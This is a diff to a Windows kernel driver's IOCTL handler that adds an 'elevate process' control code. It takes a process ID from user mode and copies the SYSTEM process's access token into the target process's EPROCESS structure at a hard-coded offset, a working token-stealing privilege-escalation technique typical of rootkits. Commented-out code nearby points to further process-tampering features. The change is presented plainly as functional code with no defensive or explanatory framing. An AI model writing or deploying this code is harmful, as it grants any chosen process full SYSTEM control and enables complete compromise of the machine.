@@ -146,6 +146,8 @@ NTSTATUS IOControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 
 
 		}
+
+
 		//else if (ControlCode == IO_CORRUPT_STACK)
 		//{
 		//	DWORD pid = *(DWORD*)Irp->AssociatedIrp.SystemBuffer;
@@ -253,6 +255,62 @@ NTSTATUS IOControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 		//	KeUnstackDetachProcess(&apc);
 		//	status = STATUS_SUCCESS;
 		//}
+
+
+		else if (ControlCode == IO_ELEVATE_PROCESS)
+		{
+
+			DWORD pid = *(DWORD*)Irp->AssociatedIrp.SystemBuffer;
+
+			DebugPrint("Control code 0x444 was passed with pid: %u\n", pid);
+
+			status = PsLookupProcessByProcessId((HANDLE)pid, &targetProcess);
+
+			if (!NT_SUCCESS(status))
+			{
+				DebugPrint("Failed to get EPROCESS (target)\n");
+				break;
+			}
+
+
+			//get process for a system process
+
+			PEPROCESS systemProcess = NULL;
+
+			status = PsLookupProcessByProcessId((HANDLE)4, &systemProcess);
+
+			if (!NT_SUCCESS(status))
+			{
+				DebugPrint("Failed to get EPROCESS (system)\n");
+				break;
+			}
+
+			
+			
+			//EPROCESS token offset on build 19045
+			ULONG tokenOffset = 0x4b8;
+
+
+
+
+			PACCESS_TOKEN targetToken = PsReferencePrimaryToken(targetProcess);
+			PACCESS_TOKEN systemToken = PsReferencePrimaryToken(systemProcess);
+
+			DebugPrint("Target Token: %p\n", targetToken);
+			DebugPrint("System Token: %p\n", systemToken);
+
+			//copy system token to target process token field
+			*(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)systemProcess + tokenOffset);
+
+			PsDereferencePrimaryToken(systemToken);
+			PsDereferencePrimaryToken(targetToken);
+			ObDereferenceObject(systemProcess);
+			ObDereferenceObject(targetProcess);
+			
+			
+			status = STATUS_SUCCESS;
+
+		}
 		else
 		{
 			DebugPrint("Unknown control code\n");
